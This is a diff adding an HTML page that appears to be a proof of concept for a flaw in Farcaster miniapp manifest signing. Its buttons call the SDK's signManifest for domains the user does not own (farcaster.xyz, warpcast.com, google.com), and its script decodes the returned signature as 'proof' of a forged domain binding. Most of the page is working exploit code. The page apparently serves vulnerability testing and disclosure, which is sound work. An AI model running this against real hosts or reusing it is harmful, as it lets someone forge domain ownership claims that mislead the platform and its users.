@@ -1,0 +1,81 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Manifest Signing Test</title>
+<style>
+  body { font: 14px monospace; padding: 20px; max-width: 800px; margin: 0 auto; background: #0a0a0a; color: #eee; }
+  button { font: 14px monospace; padding: 8px 16px; margin: 4px; cursor: pointer; background: #2a2a2a; color: #eee; border: 1px solid #555; border-radius: 4px; }
+  button:hover { background: #3a3a3a; }
+  pre { background: #1a1a1a; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; font-size: 12px; }
+  .step { color: #888; font-size: 12px; }
+  h3 { color: #6cf; }
+</style>
+</head>
+<body>
+
+<h3>WC PoC — Manifest Signing Tests</h3>
+<p class="step">Open this page as a miniapp (developers → Preview by URL, or embed in a cast). Click a button below.</p>
+
+<button onclick="testWc1()">Test WC-1: signManifest('farcaster.xyz')</button>
+<button onclick="testWc1b()">Test WC-1b: signManifest('warpcast.com')</button>
+<button onclick="testWc1c()">Test WC-1c: signManifest('google.com')</button>
+<button onclick="testContext()">Get context (my fid)</button>
+
+<hr>
+<h4>Result:</h4>
+<pre id="output">waiting…</pre>
+
+<script type="module">
+const output = document.getElementById('output');
+
+function show(label, data) {
+  output.textContent = label + '\n\n' + JSON.stringify(data, null, 2);
+}
+
+async function getSdk() {
+  const { sdk } = await import('https://esm.sh/@farcaster/miniapp-sdk@0.4.0');
+  return sdk;
+}
+
+async function signManifest(targetDomain) {
+  const sdk = await getSdk();
+  output.textContent = 'calling signManifest({domain: ' + targetDomain + '})…\n' +
+    'If a dialog appears showing host=YOUR-PAGE but signing-for=' + targetDomain + ', screenshot it.\n' +
+    'Then approve.\n';
+  try {
+    const result = await sdk.actions.signManifest({ domain: targetDomain });
+    // Decode the JFS to show the forged binding
+    const dec = (s) => JSON.parse(atob(s.replace(/-/g,'+').replace(/_/g,'/').padEnd(s.length + (4 - s.length % 4) % 4, '=')));
+    let decoded = result;
+    try {
+      decoded = {
+        header: dec(result.header),
+        payload: dec(result.payload),
+        signature: result.signature,
+        raw: result
+      };
+    } catch(e) { /* show raw if decode fails */ }
+    show('SIGNMANIFEST RESULT for ' + targetDomain + ' (decoded):\n\n' +
+         '=== PROOF: header.fid is YOUR fid, payload.domain is ' + targetDomain + ' (a domain you do NOT own) ===', decoded);
+  } catch (e) {
+    show('signManifest FAILED (may be good — host rejected):', { error: String(e), name: e?.name, type: e?.type, message: e?.message });
+  }
+}
+
+window.testWc1  = () => signManifest('farcaster.xyz');
+window.testWc1b = () => signManifest('warpcast.com');
+window.testWc1c = () => signManifest('google.com');
+
+window.testContext = async () => {
+  const sdk = await getSdk();
+  try {
+    const ctx = sdk.context; // or await sdk.getContext() depending on version
+    show('CONTEXT:', ctx);
+  } catch(e) {
+    show('context failed:', String(e));
+  }
+};
+</script>
+</body>
+</html>
